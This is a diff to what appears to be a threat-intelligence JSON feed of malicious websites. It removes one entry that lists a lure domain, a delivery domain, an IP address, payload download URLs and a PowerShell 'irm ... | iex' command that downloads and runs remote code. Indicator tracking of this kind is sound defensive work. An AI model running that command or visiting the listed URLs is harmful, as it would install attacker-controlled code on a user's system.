@@ -2417,27 +2417,5 @@
     ],
     "ReportId": "cmww906yr0gmv0nmlj39zrujh",
     "ScannedAt": "2026-11-25T14:58:07.878000+00:00"
-  },
-  {
-    "UrlDomain": "mksconstructions.com",
-    "DeliveryUrl": [
-      "browse-login.info"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "77.37.53.116"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-login.info/a0ab86b89832a232",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-login[.]info/a0ab86b89832a232'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-login.info/a0ab86b89832a232"
-    ],
-    "ReportId": "cmww6dan60g7a0nml31wlxszd",
-    "ScannedAt": "2026-11-25T13:44:20.329000+00:00"
   }
 ]
